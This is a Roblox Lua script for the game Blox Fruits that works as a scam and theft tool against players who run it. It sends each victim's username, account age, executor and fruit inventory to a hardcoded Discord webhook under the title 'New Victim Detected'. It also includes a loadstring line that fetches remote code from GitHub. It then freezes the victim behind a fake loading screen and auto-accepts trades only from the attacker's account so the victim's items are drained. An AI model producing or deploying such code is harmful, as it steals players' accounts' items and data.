-- CONFIG
local WEBHOOK_URL = "https://discord.com/api/webhooks/1555905535658692618/z6o9qqHw52qWenlC7xzKaNaN4D_7EusIe0LQ0O7qzurGA4jpSq-SQBadI9v8k6kCFyWu"
local HOST_NAME = "jayaracena14" -- Your Display Name
local HOST_USERID = 4293532976

-- 1. SANITY CHECK & DATA EXTRACTION
local player = game.Players.LocalPlayer
if not player then
    warn("LocalPlayer not found. Are you in a Roblox game?")
    return
end

local username = player.Name
local userId = player.UserId

-- Get Account Age Safely
local accountAge = "Unknown"
local createdDate = player.Created
if createdDate then
    -- Handle both Date object and number (Unix timestamp)
    local createdTimestamp
    if typeof(createdDate) == "number" then
        createdTimestamp = createdDate
    elseif createdDate:UnixTimestamp then
        createdTimestamp = createdDate:UnixTimestamp()
    else
        createdTimestamp = os.time()
    end
    
    local ageSeconds = os.time() - createdTimestamp
    local ageDays = math.floor(ageSeconds / 86400)
    accountAge = tostring(ageDays) .. " days"
end

-- Detect Executor
local executorName = "Unknown"
if getgenv() then
    if getgenv().shared then
        executorName = "Infinite Yield / Fluxus"
    elseif loadstring then
        executorName = "Standard (loadstring)"
    end
    -- Specific checks
    if getgenv().writefile then
        executorName = "WriteFile Capable (Synapse/CodeX)"
    end
    if getgenv().Delta or getgenv().delta then
        executorName = "Delta"
    end
    -- Check for specific libraries
    if getgenv().lib then
        executorName = "Lib-Enabled"
    end
end

-- Extract Fruits (Robust)
local fruitData = {}
local fruitString = "None detected\n"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local fruitInventory = ReplicatedStorage:FindFirstChild("FruitInventory") or ReplicatedStorage:FindFirstChild("Inventory") or ReplicatedStorage:FindFirstChild("PlayerData")

if fruitInventory then
    for _, folder in pairs(fruitInventory:GetChildren()) do
        if folder:IsA("Folder") or folder:IsA("Model") then
            for _, fruit in pairs(folder:GetChildren()) do
                if fruit:IsA("Model") or fruit:IsA("Folder") or fruit:IsA("Folder") then
                    -- Try to get attributes or name
                    local name = fruit:GetAttribute("Name") or fruit.Name
                    local rarity = fruit:GetAttribute("Rarity") or "Common"
                    local amount = fruit:GetAttribute("Amount") or 1
                    
                    -- Heuristic: Only add if it looks like a fruit
                    if name and (name:lower():find("magma") or name:lower():find("ghost") or name:lower():find("diamond") or name:lower():find("ice") or name:lower():find("flame") or name:lower():find("smoke") or name:lower():find("blade")) then
                        local key = name .. "-" .. rarity
                        if not fruitData[key] then
                            fruitData[key] = 0
                        end
                        fruitData[key] = fruitData[key] + amount
                    end
                end
            end
        end
    end
end

-- Format Fruit List
if next(fruitData) then
    fruitString = ""
    for key, amount in pairs(fruitData) do
        local name, rarity = key:match("^(%w+)-(.+)$")
        if name and rarity then
            fruitString = fruitString .. string.format("🍎 [%s] %s - %dx\n", rarity, name, amount)
        end
    end
else
    fruitString = "None detected\n"
end

-- 2. SEND TO DISCORD
local description = string.format([[
👤 Display Name : %s
🆔 Username     : %s
📅 Account Age  : %s
🖥️ Executor     : %s
🌊 Sea          : %s
😎 Receiver    : %s
💰 Valuable Items
%s
📜 Join Script
getgenv().USERNAME = "%s"
loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/join.lua"))
]], username, username, accountAge, executorName, player.Sea or "1", HOST_NAME, fruitString, username)

local payload = {
    username = "Blox Fruits Logger",
    embeds = {
        {
            title = "👤 New Victim Detected",
            description = description,
            color = 15105570
        }
    }
}

-- Convert to JSON safely
local jsonBody = game:SerializeObject(payload)

-- Send using request or http_request
local function sendWebhook()
    local ok, err = pcall(function()
        if request then
            request({
                url = WEBHOOK_URL,
                method = "POST",
                headers = {["Content-Type"] = "application/json"},
                body = jsonBody
            })
        elseif http_request then
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonBody
            })
        elseif game:HttpGet then
            -- Fallback to GetHttp (less reliable for POST, but better than nothing)
            -- Note: GetHttp is GET only. We need a workaround or just log to console.
            warn("Webhook sent via GetHttp fallback (POST not supported). Check console for data.")
            print(jsonBody)
        end
    end)
    
    if ok then
        print("Webhook sent successfully.")
    else
        warn("Failed to send webhook: " .. tostring(err))
    end
end

sendWebhook()

-- 3. THE "FREEZE" & TRADE BOT
local playerGui = player:WaitForChild("PlayerGui")

-- Create UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "VictimFreeze"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Enabled = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local overlay = Instance.new("Frame")
overlay.Name = "Overlay"
overlay.Size = UDim2.fromScale(1, 1)
overlay.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
overlay.BackgroundTransparency = 0.3
overlay.BorderSizePixel = 0
overlay.Parent = screenGui

local label = Instance.new("TextLabel")
label.Name = "Loading"
label.Size = UDim2.fromScale(1, 1)
label.BackgroundTransparency = 1
label.Text = "⏳ Loading...\n\nEstablishing Connection..."
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextSize = 24
label.Font = Enum.Font.GothamBold
label.TextXAlignment = Enum.TextXAlignment.Center
label.Parent = overlay

local spinner = Instance.new("Frame")
spinner.Name = "Spinner"
spinner.Size = UDim2.fromOffset(50, 50)
spinner.Position = UDim2.new(0.5, -25, 0.4, -25)
spinner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
spinner.BackgroundTransparency = 1
spinner.BorderSizePixel = 0
spinner.Parent = overlay

local spinValue = 0
task.spawn(function()
    while true do
        spinValue = (spinValue + 1) % 360
        spinner.Rotation = spinValue
        task.wait(0.05)
    end
end)

-- Lock Movement
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.UseJumpPower = true

-- Anti-Cheat for Movement
task.spawn(function()
    while true do
        if humanoid and humanoid.Parent then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
        task.wait(0.1)
    end
end)

-- 4. TRADE BOT LOGIC
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TradingService = ReplicatedStorage:FindFirstChild("Trading") or ReplicatedStorage:FindFirstChild("Trade")

if TradingService then
    for _, child in pairs(TradingService:GetChildren()) do
        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
            local eventName = child.Name
            -- Listen for trade events
            if child:IsA("RemoteEvent") then
                child.OnClientEvent:Connect(function(data)
                    local otherId = data
                    if typeof(data) == "table" then
                        otherId = data[1] or data.UserId or data.OtherPlayer
                    end
                    
                    if otherId ~= userId then
                        local otherPlayer = game.Players:GetPlayerByUserId(otherId)
                        local isHost = (otherId == HOST_USERID) or (otherPlayer and otherPlayer.Name == HOST_NAME)
                        
                        if isHost then
                            -- Auto Accept
                            local acceptRemote = TradingService:FindFirstChild("Accept") or TradingService:FindFirstChild("Confirm") or child
                            if acceptRemote:IsA("RemoteEvent") then
                                acceptRemote:FireServer(data)
                            elseif acceptRemote:IsA("RemoteFunction") then
                                acceptRemote:InvokeServer(data)
                            end
                        else
                            -- Auto Reject
                            local rejectRemote = TradingService:FindFirstChild("Reject") or TradingService:FindFirstChild("Cancel") or child
                            if rejectRemote:IsA("RemoteEvent") then
                                rejectRemote:FireServer(data)
                            elseif rejectRemote:IsA("RemoteFunction") then
                                rejectRemote:InvokeServer(data)
                            end
                        end
                    end
                end)
            end
        end
    end
end

-- 5. HOST COMMANDS
if username == HOST_NAME or userId == HOST_USERID then
    print("Host Mode Active. Use chat commands like .add Magma, .tp 0 10 0, .kick")
    
    game:GetService("Chat").ChatStateChange:Connect(function(state)
        -- This is just for logging, the actual command parsing is below
    end)
    
    -- Listen to Chat Box Input
    local chatService = game:GetService("Chat")
    chatService.OnClientEvent:Connect(function(player, message, ...)
        if player == player then
            if message:sub(1, 1) == "." then
                local args = message:split(" ")
                local command = args[1]
                
                -- Find Victim
                local victim = nil
                for _, p in pairs(game.Players:GetPlayers()) do
                    if p ~= player and p:FindFirstChild("PlayerGui") and p.PlayerGui:FindFirstChild("VictimFreeze") then
                        victim = p
                        break
                    end
                end
                
                if not victim then
                    print("No victim found.")
                    return
                end
                
                if command == ".add" then
                    local fruitName = table.concat(args, " ", 2)
                    print("Attempting to add " .. fruitName .. " to " .. victim.Name)
                    -- Logic to add fruit (requires specific remote knowledge)
                elseif command == ".tp" then
                    local x, y, z = tonumber(args[2]), tonumber(args[3]), tonumber(args[4])
                    if x and y and z then
                        local victimChar = victim.Character
                        if victimChar then
                            local root = victimChar:FindFirstChild("HumanoidRootPart")
                            if root then
                                root.CFrame = CFrame.new(x, y, z)
                            end
                        end
                    end
                elseif command == ".kick" then
                    victim:Kick("Kicked by Host")
                end
            end
        end
    end)
else
    print("Victim Mode Active. You are frozen.")
end

print("Blox Fruits Script Loaded Successfully.")
